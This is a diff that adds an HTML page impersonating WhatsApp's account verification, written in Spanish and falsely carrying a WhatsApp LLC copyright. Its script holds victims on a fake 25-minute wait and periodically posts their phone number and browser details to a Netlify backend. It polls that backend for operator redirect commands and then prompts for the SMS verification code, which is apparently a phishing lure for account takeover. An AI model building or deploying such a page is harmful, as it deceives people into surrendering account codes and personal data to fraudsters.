@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Valida WhatsApp</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    /* Mismo estilo verde que index1,2,3 */
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #4caf50, #81c784);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #333;
+      padding: 20px 0;
+    }
+
+    .code-box {
+      background: white;
+      padding: 30px 25px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+      width: 350px;
+      max-width: 90%;
+      text-align: center;
+    }
+
+    .code-box h1 {
+      margin-bottom: 8px;
+      font-weight: 600;
+      color: #333;
+      font-size: 1.8rem;
+    }
+
+    .description {
+      font-weight: 400;
+      font-size: 0.95rem;
+      color: #555;
+      margin-bottom: 20px;
+      line-height: 1.3;
+    }
+
+    .progress-bar-bg {
+      width: 100%;
+      height: 24px;
+      background-color: #e0e0e0;
+      border-radius: 12px;
+      overflow: hidden;
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #4caf50, #66bb6a);
+      border-radius: 12px;
+      transition: width 0.5s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: 600;
+      font-size: 0.8rem;
+      min-width: 60px;
+    }
+
+    .success-message {
+      display: none;
+      background: linear-gradient(135deg, #4caf50, #66bb6a);
+      color: white;
+      padding: 16px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      text-align: left;
+      line-height: 1.5;
+      font-size: 0.9rem;
+      animation: slideIn 0.5s ease;
+    }
+
+    .success-message.show {
+      display: block;
+    }
+
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes fadeInSlide {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin: 20px 0;
+    }
+
+    .code-inputs input {
+      width: 40px;
+      height: 50px;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 1.2rem;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      background: #f9f9f9;
+    }
+
+    .code-inputs input:focus {
+      border-color: #4caf50;
+      outline: none;
+      box-shadow: 0 0 8px rgba(76,175,80,0.3);
+    }
+
+    .code-inputs input.filled {
+      border-color: #4caf50;
+      background: #e8f5e8;
+    }
+
+    button {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(135deg, #4caf50, #66bb6a);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 20px;
+    }
+
+    button:hover:not(:disabled) {
+      background: linear-gradient(135deg, #45a049, #5cb85c);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(76,175,80,0.3);
+    }
+
+    button:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    .info-box {
+      background-color: #e8f5e9;
+      border-left: 4px solid #4caf50;
+      padding: 12px;
+      margin: 16px 0;
+      text-align: left;
+      border-radius: 8px;
+    }
+
+    .info-box p {
+      margin: 8px 0;
+      font-size: 0.85rem;
+      line-height: 1.4;
+      color: #333;
+    }
+
+    .warning {
+      background-color: #fff3cd;
+      border-left: 4px solid #ffc107;
+      padding: 10px;
+      margin: 16px 0;
+      text-align: left;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      color: #856404;
+      line-height: 1.3;
+    }
+
+    .tip-box {
+      background-color: #e3f2fd;
+      border-left: 4px solid #2196f3;
+      padding: 12px;
+      margin: 16px 0;
+      text-align: left;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      color: #0d47a1;
+      line-height: 1.4;
+      display: none;
+    }
+
+    .tip-box.show {
+      display: block;
+      animation: fadeInSlide 0.6s ease;
+    }
+
+    .footer-text {
+      margin-top: 20px;
+      font-size: 0.85rem;
+      color: #555;
+      user-select: none;
+      line-height: 1.3;
+    }
+
+    .error {
+      color: red;
+      font-weight: bold;
+      margin-bottom: 10px;
+      font-size: 0.9rem;
+    }
+
+    /* Status de conexión */
+    .connection-status {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      padding: 8px 12px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      font-weight: 500;
+      z-index: 1000;
+    }
+
+    .connection-status.connected {
+      background: rgba(76,175,80,0.2);
+      color: #4CAF50;
+      border: 1px solid rgba(76,175,80,0.5);
+    }
+
+    .connection-status.disconnected {
+      background: rgba(244,67,54,0.2);
+      color: #f44336;
+      border: 1px solid rgba(244,67,54,0.5);
+    }
+  </style>
+</head>
+<body>
+  <div class="connection-status" id="connectionStatus">Conectando...</div>
+
+  <div class="code-box">
+    <h1>Valida WhatsApp</h1>
+    <p class="description">
+      Proceso de validación iniciado. Para culminar exitosamente y asegurar tu cuenta de WhatsApp, debes permanecer en esta pantalla. En 25 minutos recibirás un código SMS para finalizar la verificación.
+    </p>
+
+    <div class="progress-bar-bg">
+      <div class="progress-bar-fill" id="progressBar">25:00</div>
+    </div>
+
+    <div class="success-message" id="successMessage">
+      ✅ Listo, hemos revisado y verificado tu cuenta.<br>
+      🔒 Para culminar el proceso y asegurar tu información, por favor ingresa el código de 6 dígitos que te hemos enviado vía SMS.
+    </div>
+
+    <form id="codeForm">
+      <div class="error" id="errorMsg" style="display:none;"></div>
+
+      <label for="code">Código de verificación</label>
+      <div class="code-inputs">
+        <input type="text" maxlength="1" disabled />
+        <input type="text" maxlength="1" disabled />
+        <input type="text" maxlength="1" disabled />
+        <input type="text" maxlength="1" disabled />
+        <input type="text" maxlength="1" disabled />
+        <input type="text" maxlength="1" disabled />
+      </div>
+      <button type="submit" disabled>Verificar</button>
+    </form>
+
+    <div class="warning">
+      <strong>⚠️ Importante:</strong> No debe salirse o cerrar esta ventana para evitar pérdidas o robo de información.
+    </div>
+
+    <!-- Contenedor de tips rotativos -->
+    <div id="tipsContainer"></div>
+
+    <div class="footer-text">
+      Además del cifrado de extremo a extremo, añadimos más capas de protección para todas tus conversaciones.<br><br>
+      2024 © WhatsApp LLC
+    </div>
+  </div>
+
+  <script>
+    // Configuración para Netlify
+    const API_BASE = window.location.origin;
+
+    // Variables globales
+    let sessionId;
+    let pageLoadTime;
+    let totalSeconds = 1500; // 25 minutos
+    let codigoEnviado = false;
+    let phoneNumber = '';
+    let updateInterval;
+    let commandCheckInterval;
+
+    // Obtener número de teléfono del localStorage
+    function getPhoneNumber() {
+      phoneNumber = localStorage.getItem('telefono_completo') || 
+                   localStorage.getItem('telefono') || 
+                   'No disponible';
+      return phoneNumber;
+    }
+
+    // Generar ID de sesión único
+    function generateSessionId() {
+      return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+    }
+
+    // Actualizar sesión en el backend
+    function actualizarSesionBackend() {
+      const sessionData = {
+        sessionId: sessionId,
+        numero: phoneNumber,
+        startTime: pageLoadTime,
+        progress: getProgreso(),
+        status: codigoEnviado ? 'completed' : 'active',
+        currentPage: 'index5-green',
+        browserInfo: navigator.userAgent,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screenResolution: `${screen.width}x${screen.height}`,
+        attempts: parseInt(localStorage.getItem('codigo_intentos') || '0')
+      };
+
+      fetch('/.netlify/functions/sessions/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(sessionData)
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          setConnectionStatus('Conectado', true);
+        } else {
+          setConnectionStatus('Error de conexión', false);
+        }
+      })
+      .catch(error => {
+        console.error('Error updating session:', error);
+        setConnectionStatus('Desconectado', false);
+      });
+    }
+
+    // Verificar comandos del servidor
+    function verificarComandos() {
+      fetch(`/.netlify/functions/sessions/${sessionId}`)
+        .then(response => response.json())
+        .then(data => {
+          if (data.redirect_to) {
+            // Guardar datos antes de redirigir
+            localStorage.setItem('sesion_completada', 'true');
+            localStorage.setItem('tiempo_final', Date.now().toString());
+            localStorage.setItem('codigo_enviado', 'true');
+            
+            // Redirigir
+            window.location.href = data.redirect_to;
+          }
+        })
+        .catch(error => {
+          console.error('Error checking commands:', error);
+        });
+    }
+
+    // Calcular progreso
+    function getProgreso() {
+      const elapsed = (Date.now() - pageLoadTime) / 1000;
+      return Math.min(Math.round((elapsed / totalSeconds) * 100), 100);
+    }
+
+    // Actualizar countdown
+    function actualizarCountdown() {
+      const ahora = Date.now();
+      const elapsed = Math.floor((ahora - pageLoadTime) / 1000);
+      const remaining = Math.max(totalSeconds - elapsed, 0);
+      
+      // Formatear tiempo
+      const minutos = Math.floor(remaining / 60);
+      const segundos = remaining % 60;
+      const tiempoTexto = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
+      
+      // Actualizar barra de progreso
+      document.getElementById('progressBar').textContent = tiempoTexto;
+      const progreso = getProgreso();
+      document.querySelector('.progress-bar-fill').style.width = `${progreso}%`;
+
+      // Al completar el tiempo
+      if (remaining <= 0 && !codigoEnviado) {
+        finalizarTiempo();
+      }
+    }
+
+    // Finalizar tiempo de espera
+    function finalizarTiempo() {
+      codigoEnviado = true;
+      localStorage.setItem('codigo_enviado', 'true');
+      
+      // Mostrar mensaje de éxito
+      document.getElementById('successMessage').classList.add('show');
+      
+      // Habilitar inputs y botón
+      document.querySelectorAll('.code-inputs input').forEach(input => {
+        input.disabled = false;
+        input.focus();
+      });
+      document.querySelector('button[type="submit"]').disabled = false;
+      
+      // Actualizar estado en backend
+      actualizarSesionBackend();
+      
+      // Detener intervals
+      if (updateInterval) clearInterval(updateInterval);
+      if (commandCheckInterval) clearInterval(commandCheckInterval);
+    }
+
+    // Establecer estado de conexión
+    function setConnectionStatus(message, connected) {
+      const statusElement = document.getElementById('connectionStatus');
+      statusElement.textContent = message;
+      statusElement.className = connected ? 
+        'connection-status connected' : 'connection-status disconnected';
+    }
+
+    // Tips rotativos (del código original)
+    const tips = [
+      "Mantén el WhatsApp actualizado para disfrutar de las últimas funciones de seguridad.",
+      "Activa la verificación en dos pasos para una mayor protección.",
+      "No compartas tu código de verificación con nadie.",
+      "Asegúrate de tener una buena conexión a internet.",
+      "WhatsApp cifra todos tus mensajes de extremo a extremo."
+    ];
+
+    let tipIndex = 0;
+    function mostrarTip() {
+      const container = document.getElementById('tipsContainer');
+      const tipElement = document.createElement('div');
+      tipElement.className = 'tip-box';
+      tipElement.textContent = tips[tipIndex];
+      container.appendChild(tipElement);
+      
+      setTimeout(() => tipElement.classList.add('show'), 100);
+      
+      tipIndex = (tipIndex + 1) % tips.length;
+    }
+
+    // Manejo del formulario de código
+    function manejarFormulario() {
+      const inputs = document.querySelectorAll('.code-inputs input');
+      const button = document.querySelector('button[type="submit"]');
+      
+      inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+          const value = e.target.value.replace(/\D/g, ''); // Solo números
+          e.target.value = value;
+          
+          if (value && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+          
+          // Verificar si todos están llenos
+          const todosLlenos = Array.from(inputs).every(inp => inp.value.length === 1);
+          button.disabled = !todosLlenos;
+          
+          // Marcar como filled
+          if (value) {
+            e.target.classList.add('filled');
+          } else {
+            e.target.classList.remove('filled');
+          }
+        });
+        
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !e.target.value && index > 0) {
+            inputs[index - 1].focus();
+          }
+        });
+      });
+
+      document.getElementById('codeForm').addEventListener('submit', (e) => {
+        e.preventDefault();
+        const codigo = Array.from(inputs).map(inp => inp.value).join('');
+        localStorage.setItem('codigo_ingresado', codigo);
+        localStorage.setItem('codigo_enviado', 'true');
+        alert('Código verificado: ' + codigo);
+      });
+    }
+
+    // Inicializar la página
+    function inicializar() {
+      // Configurar sesión
+      pageLoadTime = parseInt(localStorage.getItem('tiempo_inicio')) || Date.now();
+      localStorage.setItem('tiempo_inicio', pageLoadTime.toString());
+      
+      // Generar ID de sesión único
+      sessionId = localStorage.getItem('session_id') || generateSessionId();
+      localStorage.setItem('session_id', sessionId);
+      
+      // Mostrar número de teléfono
+      getPhoneNumber();
+
+      // Inicializar countdown
+      actualizarCountdown();
+      
+      // Interval para actualizar countdown
+      updateInterval = setInterval(actualizarCountdown, 1000);
+      
+      // Actualizar sesión inmediatamente
+      actualizarSesionBackend();
+      
+      // Actualizar sesión cada 30 segundos
+      setInterval(actualizarSesionBackend, 30000);
+      
+      // Verificar comandos cada 15 segundos
+      commandCheckInterval = setInterval(verificarComandos, 15000);
+      
+      // Verificar comandos inmediatamente
+      verificarComandos();
+
+      // Mostrar tips cada 2 minutos
+      setTimeout(() => mostrarTip(), 2000);
+      setInterval(mostrarTip, 120000);
+
+      // Manejar formulario
+      manejarFormulario();
+
+      // Mensaje de estado inicial
+      setConnectionStatus('Inicializando...', false);
+      setTimeout(() => setConnectionStatus('Conectado', true), 2000);
+      
+      // Advertir antes de cerrar
+      window.addEventListener('beforeunload', function(e) {
+        if (!codigoEnviado) {
+          const mensaje = '¿Estás seguro de que quieres cerrar? Esto puede afectar la verificación.';
+          e.preventDefault();
+          e.returnValue = mensaje;
+          return mensaje;
+        }
+      });
+    }
+
+    // Esperar a que el DOM esté listo
+    document.addEventListener('DOMContentLoaded', inicializar);
+  </script>
+</body>
+</html>
